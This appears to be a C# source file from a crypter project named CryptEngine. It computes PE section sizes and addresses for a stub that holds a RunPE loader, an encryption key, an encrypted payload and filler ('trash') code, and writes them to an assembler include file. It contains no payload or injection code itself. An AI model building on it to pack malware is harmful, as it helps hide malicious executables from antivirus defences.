using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using CryptEngine.Extensions;
using System.Diagnostics;

namespace CryptEngine
{
    public static class SectionAddresses
    {
        public static void ComputeSectionAddresses(string FilePath, string IDataPath, string DataPath, string RunPEPath, string IncKeyPath, string IncPayloadPath, int SizeTrash)
        {
            string writer = "TEXT_SECTION_ADDRESS EQU 0x1000\n" +
                            "IDATA_SECTION_ADDRESS EQU 0x{0}\n" +
                            "DATA_SECTION_ADDRESS EQU 0x{1}\n" +
                            "TLS_SECTION_ADDRESS EQU 0x{2}";

            // compute idata size
            int idata_object_size = 0;
            byte[] cc = IDataPath.ReadBytes();
            idata_object_size = cc.Length;
            Console.WriteLine(idata_object_size);
            // end compute size

            // compute data size
            int data_object_size = 0;
            cc = DataPath.ReadBytes();
            data_object_size = cc.Length;

            cc = RunPEPath.ReadBytes();
            data_object_size += cc.Length;

            cc = IncKeyPath.ReadBytes();
            data_object_size += cc.Length;

            cc = IncPayloadPath.ReadBytes();
            data_object_size += cc.Length;
            //end compute size

            Console.WriteLine("TEXT SIZE: {0}", SizeTrash.ToString("X4"));
            Console.WriteLine("IDATA SIZE: {0}", idata_object_size.ToString("X4"));
            Console.WriteLine("DATA SIZE: {0}", data_object_size.ToString("X4"));

            int diff = (int)Math.Ceiling((double)(SizeTrash + 350) / 0x1000) * 0x1000;
            int diff2 = (int)Math.Ceiling((double)idata_object_size / 0x1000) * 0x1000;
            int diff3 = (int)Math.Ceiling((double)data_object_size / 0x1000) * 0x1000;

            Console.WriteLine("DIFF 1: {0}", diff.ToString("X4"));
            Console.WriteLine("DIFF 2: {0}", diff2.ToString("X4"));
            Console.WriteLine("DIFF 3: {0}", diff3.ToString("X4"));

            writer = string.Format(writer, (0x4000).ToString("X4"), ((0x1000) + diff2).ToString("X4"), ((0x1000 + diff2) + diff3).ToString("X4"));
            Console.WriteLine(writer);

            if (File.Exists(FilePath))
                File.Delete(FilePath);

            File.WriteAllText(FilePath, writer);
        }

        public static void ComputeAddresses(string SectionAddressPath, string ObjDirectory, string IncludesDirectory)
        {
            int SECTION_BASE = 0x1000;
            int KEY_SIZE = 0x10;

            string txtObjPath = Path.Combine(ObjDirectory, "text.o");
            string idataObjPath = Path.Combine(ObjDirectory, "idata.o");
            string dataObjPath = Path.Combine(ObjDirectory, "data.o");
            string runpeObjPath = Path.Combine(ObjDirectory, "runpe.o");

            int sizeOfTextObject = txtObjPath.ReadBytes().Length;
            int sizeOfIDataObject = idataObjPath.ReadBytes().Length;
            int sizeOfDataObject = dataObjPath.ReadBytes().Length; // need to add encrypted code + key size
            int sizeOfRunPEObject = runpeObjPath.ReadBytes().Length; // encrypted code + 16 + data_heur = .data.rawsize

            int RawSize_Text = ALIGN_UP(sizeOfTextObject, 0x200);
            int RawSize_IData = ALIGN_UP(sizeOfIDataObject, 0x200);
            int RawSize_Data = ALIGN_UP((sizeOfDataObject + sizeOfRunPEObject + KEY_SIZE), 0x200);

            int VA_TEXT = SECTION_BASE;
            int VA_IDATA = SECTION_BASE + VA_TEXT + ALIGN_DOWN(RawSize_Text, 0x1000);
            int VA_DATA = SECTION_BASE + VA_IDATA + ALIGN_DOWN(RawSize_IData, 0x1000);
            int VA_TLS = SECTION_BASE + VA_DATA + ALIGN_DOWN(RawSize_Data, 0x1000);

            // 0xC0DE = DATA_SECTION_ADDRESS
            // 0xBEEF = RUNPE_LENGTH

            //byte[] txtBuffer = txtObjPath.ReadBytes();

            //for (int i = 0; i < txtBuffer.Length; i++)
            //{
            //    if (txtBuffer[i] == 0xDE && txtBuffer[i + 1] == 0xC0)
            //    {
            //        byte[] b_DataAddress = BitConverter.GetBytes(VA_DATA);

            //        txtBuffer[i] = b_DataAddress[1];
            //        txtBuffer[i + 1] = b_DataAddress[0];
            //    }

            //    if (txtBuffer[i] == 0xEF && txtBuffer[i + 1] == 0xBE)
            //    {
            //        byte[] b_DataAddress = BitConverter.GetBytes(VA_DATA);

            //        txtBuffer[i] = b_DataAddress[1];
            //        txtBuffer[i + 1] = b_DataAddress[0];
            //    }
            //}

            //if (File.Exists(txtObjPath))
            //    File.Delete(txtObjPath);

            //txtBuffer.WriteFileBytes(txtObjPath);

            string IncludeFile =
                            "TEXT_SECTION_ADDRESS EQU 0x1000\n" +
                           "IDATA_SECTION_ADDRESS EQU 0x{0}\n" +
                           "DATA_SECTION_ADDRESS EQU 0x{1}\n" +
                           "TLS_SECTION_ADDRESS EQU 0x{2}";

            IncludeFile = String.Format(IncludeFile,
                                VA_IDATA.ToString("X4"),
                                VA_DATA.ToString("X4"),
                                VA_TLS.ToString("X4"));

            Console.WriteLine(IncludeFile);

            if (File.Exists(SectionAddressPath))
                File.Delete(SectionAddressPath);

            SectionAddressPath.WriteText(IncludeFile, StringEncoding.ASCII);
        }

        private static int ALIGN_UP(int x, int y)
        {
            return ((x + (y - 1)) & (~(y - 1)));
        }

        private static int ALIGN_DOWN(int x, int y)
        {
            return (x & (~(y - 1)));
        }
    }
}
